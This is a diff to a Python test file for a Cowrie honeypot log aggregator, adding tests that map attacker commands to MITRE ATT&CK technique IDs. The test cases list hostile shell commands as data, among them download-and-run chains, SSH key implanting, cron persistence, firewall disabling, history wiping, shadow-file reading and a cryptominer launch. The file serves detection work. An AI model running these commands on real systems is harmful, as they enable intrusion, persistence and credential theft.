@@ -146,12 +146,77 @@ class AggregateTest(unittest.TestCase):
         self.assertEqual(aggregate.clean("a\\x1bb", []), "a b")
         self.assertEqual(aggregate.clean("keep \\x41", []), "keep \\x41")
 
+    def test_ttps_once_per_session(self):
+        _, s = self.run_agg()
+        got = {t["id"]: t["sessions"] for t in s["ttps"]}
+        # DAY1 has no session ids, so everything shares one (None) session per day
+        self.assertEqual(got["T1110.001"], 2)   # one per day
+        self.assertEqual(got["T1078"], 1)
+        self.assertEqual(got["T1105"], 1)       # wget command + file_download, same session
+        self.assertEqual(got["T1059.004"], 1)   # | sh
+        self.assertEqual(s["ttps"][0]["tactic"], "Credential Access")
+
     def test_empty(self):
         os.remove(os.path.join(self.logs, "cowrie.json.2026-11-01"))
         os.remove(os.path.join(self.logs, "cowrie.json"))
         _, s = self.run_agg()
         self.assertEqual(s["totals"]["sessions"], 0)
         self.assertIsNone(s["first_day"])
+
+
+class TagTest(unittest.TestCase):
+    CASES = {
+        "uname -a": {"T1082"},
+        "cat /proc/cpuinfo | grep name | wc -l": {"T1082"},
+        "whoami": {"T1033"},
+        "cd /tmp; id": {"T1033"},
+        "ps aux": {"T1057"},
+        "ifconfig; ip a": {"T1016"},
+        "ls -la /var/run": {"T1083"},
+        "cat /etc/passwd": {"T1087.001"},
+        "cat /etc/shadow": {"T1003.008"},
+        "curl -s hxxp[:]//x/y -o y; chmod +x y; ./y.sh": {"T1105", "T1222.002", "T1059.004"},
+        "echo ssh-rsa AAAA >> ~/.ssh/authorized_keys; chattr +i ~/.ssh/authorized_keys": {"T1098.004", "T1222.002"},
+        "(crontab -l; echo '* * * * * /tmp/x') | crontab -": {"T1053.003"},
+        "echo root:pass|chpasswd": {"T1098"},
+        "rm -rf /tmp/*; history -c": {"T1070.004", "T1070.003"},
+        "systemctl stop firewalld; ufw disable": {"T1562.001"},
+        "./XMRig --url stratum+tcp://pool": {"T1496"},
+        "echo /dev/tcp/1/2": {"T1105"},
+        # Mirai-style IoT bots
+        "enable": {"T1059.008"},
+        " shell ": {"T1059.008"},
+        "sh": {"T1059.008"},
+        "ping ;sh": {"T1059.004"},
+        "/bin/busybox echo > /dev/shm/.b && sh /dev/shm/.b && cd /dev/shm/": {"T1059.004"},
+        "sh .k": {"T1059.004"},
+        '/bin/busybox echo -ne "\\x7f\\x45\\x4c\\x46\\x01" >> .d': {"T1105", "T1027"},
+    }
+    NONE = ["ls" + "x", "echo hello", "enable the thing", "systemd", "shellcheck x", "cat /etc/issue", "stop",
+            "laptop", "identity", "rmdir x", "free", "/bin/busybox UNSTABLE", 'echo -ne "\\x41" > a',
+            "sha256sum x", "finish"]
+
+    def test_patterns(self):
+        for cmd, want in self.CASES.items():
+            self.assertEqual(aggregate.tag("cowrie.command.input", cmd), want, cmd)
+
+    def test_no_false_tags(self):
+        for cmd in self.NONE:
+            self.assertEqual(aggregate.tag("cowrie.command.input", cmd), set(), cmd)
+
+    def test_event_rules(self):
+        self.assertEqual(aggregate.tag("cowrie.login.failed"), {"T1110.001"})
+        self.assertEqual(aggregate.tag("cowrie.session.connect"), set())
+
+    def test_rules_file_is_well_formed(self):
+        with open(aggregate.RULES_FILE) as fh:
+            rules = json.load(fh)["rules"]
+        for r in rules:
+            self.assertRegex(r["id"], r"^T\d{4}(\.\d{3})?$")
+            self.assertTrue(r["name"] and r["tactic"])
+            self.assertEqual(("event" in r) + ("pattern" in r), 1, r["id"])
+            # (?i) only at the start, so Python and PCRE read it the same way
+            self.assertNotIn("(?i)", r.get("pattern", "")[4:])
 
 
 if __name__ == "__main__":
